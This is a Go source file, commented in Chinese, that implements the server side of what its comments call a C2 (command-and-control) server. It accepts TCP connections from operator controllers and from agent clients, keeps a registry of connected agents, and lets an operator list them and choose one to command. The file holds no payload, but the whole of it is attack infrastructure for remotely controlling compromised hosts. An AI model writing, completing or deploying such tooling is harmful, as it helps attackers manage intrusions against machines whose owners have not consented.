package server

import (
	"fmt"
	"net"
	"sync"
)

// Server 表示C2服务器
type Server struct {
	listenAddr string
	clients    map[int]*Client
	nextID     int
	mu         sync.Mutex
}

// NewServer 创建新的服务器实例
func NewServer(listenAddr string) *Server {
	return &Server{
		listenAddr: listenAddr,
		clients:    make(map[int]*Client),
		nextID:     1,
	}
}

// Start 启动服务器
func (s *Server) Start() error {
	listener, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("启动监听失败: %w", err)
	}
	defer listener.Close()

	fmt.Println("服务器已启动，等待连接...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("接受连接失败:", err)
			continue
		}

		// 读取连接类型标识（第一个字节）
		buffer := make([]byte, 1)
		_, err = conn.Read(buffer)
		if err != nil {
			fmt.Println("读取连接类型失败:", err)
			conn.Close()
			continue
		}

		connectionType := buffer[0]
		switch connectionType {
		case 'C': // 控制端连接
			go s.handleControllerConnection(conn)
		case 'A': // 客户端连接
			go s.handleClientConnection(conn)
		default:
			fmt.Printf("未知的连接类型: %c\n", connectionType)
			conn.Close()
		}
	}
}

// handleControllerConnection 处理控制端连接
func (s *Server) handleControllerConnection(conn net.Conn) {
	controller := NewController(conn, s)
	fmt.Printf("控制端已连接: %s\n", conn.RemoteAddr())

	// 发送欢迎消息
	controller.sendMessage("C2服务器控制端已连接。可用命令:\n" +
		"- list nodes: 列出所有连接的客户端\n" +
		"- choose <id>: 选择一个客户端\n" +
		"- exit: 断开连接\n")

	// 启动命令处理循环
	controller.handleCommands()

	fmt.Printf("控制端已断开连接: %s\n", conn.RemoteAddr())
}

// handleClientConnection 处理客户端连接
func (s *Server) handleClientConnection(conn net.Conn) {
	s.mu.Lock()
	clientID := s.nextID
	s.nextID++
	client := NewClient(clientID, conn)
	s.clients[clientID] = client
	s.mu.Unlock()

	fmt.Printf("客户端 #%d 已连接: %s\n", clientID, conn.RemoteAddr())
	client.Start()

	// 客户端断开后清理
	s.RemoveClient(clientID)
	fmt.Printf("客户端 #%d 已断开连接\n", clientID)
}

// ListClients 返回所有已连接的客户端
func (s *Server) ListClients() []*Client {
	s.mu.Lock()
	defer s.mu.Unlock()

	clients := make([]*Client, 0, len(s.clients))
	for _, client := range s.clients {
		clients = append(clients, client)
	}
	return clients
}

// GetClient 根据ID获取客户端
func (s *Server) GetClient(id int) *Client {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.clients[id]
}

// RemoveClient 移除指定的客户端
func (s *Server) RemoveClient(id int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.clients, id)
}
